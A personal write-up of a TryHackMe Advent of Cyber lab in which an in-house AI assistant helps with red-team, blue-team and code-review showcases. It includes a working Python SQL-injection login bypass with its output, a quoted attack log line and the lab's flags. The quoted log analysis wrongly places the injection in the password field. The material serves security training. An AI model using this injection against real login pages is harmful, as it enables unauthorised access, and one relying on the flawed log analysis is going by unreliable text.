# Day 4: AI in Security - old sAInt nick
> The lights glimmer and servers hum blissfully at The Best Festival Company (TBFC), melting the snow surrounding the data centre. TBFC has continued its pursuit of AI excellence. After the past two years, they realise that Van Chatty, their in-house chatbot, wasn’t quite meeting their standards. 

> Unfortunately for the elves at TBFC, they are also not immune to performance metrics. The elves aim to find ways of increasing their velocity; something to manage the tedious, distracting tasks, which allows the elves to do the real magic. 

> TBFC, adventurous as ever, is trialling their brand new cyber security AI assistant, Van SolveIT, which is capable of helping the elves with all their defensive, offensive, and software needs. They decide to put this flashy technology to use as Christmas approaches, to identify, confirm, and resolve any potential vulnerabilities, before any nay-sayers can.
## Task 1: Introduction: 
- Started the Attacker box and target virtual machine
## Task 2: AI for cyber security Showcase
> You will be interacting with Van SolveIT, who will guide you through three showcases of how AI can be used in cyber security. http://10.49.166.213
### Solution:
- I start with the Red assistant
  > Welcome to the Red Team showcase! I can help you generate Python scripts for the vulnerabilities within the web application of today's Advent of Cyber web application.
  - I do what the AI assistant tells me to and create the .py file pasting the python code given
  - ```py
    import requests

    # Set up the login credentials
    username = "alice' OR 1=1 -- -"
    password = "test"

    # URL to the vulnerable login page
    url = "http://MACHINE_IP:5000/login.php"

    # Set up the payload (the input)
    payload = {
        "username": username,
        "password": password
    }

    # Send a POST request to the login page with our payload
    response = requests.post(url, data=payload)

    # Print the response content
    print("Response Status Code:", response.status_code)
    print("\nResponse Headers:")
    for header, value in response.headers.items():
        print(f"  {header}: {value}")
    print("\nResponse Body:")
    print(response.text)
    ```
  - ```bash
    root@ip-10-49-167-53:~# python3 script.py
     Response Status Code: 200

     Response Headers:
      Date: Thu, 18 Dec 2025 13:40:04 GMT
      Server: Apache/2.4.65 (Debian)
      X-Powered-By: PHP/8.1.33
      Expires: Thu, 19 Nov 1981 08:52:00 GMT
      Cache-Control: no-store, no-cache, must-revalidate
      Pragma: no-cache
      Vary: Accept-Encoding
      Content-Encoding: gzip
      Content-Length: 540
      Keep-Alive: timeout=5, max=99
      Connection: Keep-Alive
      Content-Type: text/html; charset=UTF-8

    Response Body:
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard - SQLi Lab</title>
        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>
    <body class="dashboard-body">
        <div class="dashboard-container">
            <div class="welcome-banner">
                <h1>Welcome, admin!</h1>
                <p>You have successfully logged in to the system.</p>
            </div>
        
        
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <h4 class="alert-heading">Exploit Successful!</h4>
                <hr>
                <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
        
            <a href="logout.php" class="btn btn-danger">Logout</a>
        </div>
    
        <script src="assets/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    ```
  - Thus i get the flag as `THM{SQLI_EXPLOIT}`

    
- We will move onto blue now.
  > Welcome to the Blue Team showcase! I'm your Blue Team Assistant. I can analyse logs and explain them. Let's solve this stage together. You can ask me to analyse an example set of logs for the attack that we just performed!
  - It gives `198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"`
     -  IP Address: The user is likely logged in via a public IP, indicating a potential external attack.
     - Time and Date: The attack occurred on October 3rd, 2025, at 09:03.
     - URL: The login.php page was accessed, which is a common endpoint for user authentication.
     - Username: "alice" was attempted, with an SQL injection attempt in the password parameter.
     - SQL Injection: The log shows "alice%27+OR+1%3D1+--+-&password=test", indicating a potential vulnerability in the password validation logic.

- Now for software assisstant
  > Welcome to the Software showcase! I can help you identify vulnerabilities in source code. Shall we take a look at the source code of today's Advent of Cyber web application?
  - It basically explained what it does in brief and then i completed the showcase which gave me the final flag

Flag: `THM{AI_MANIA}`

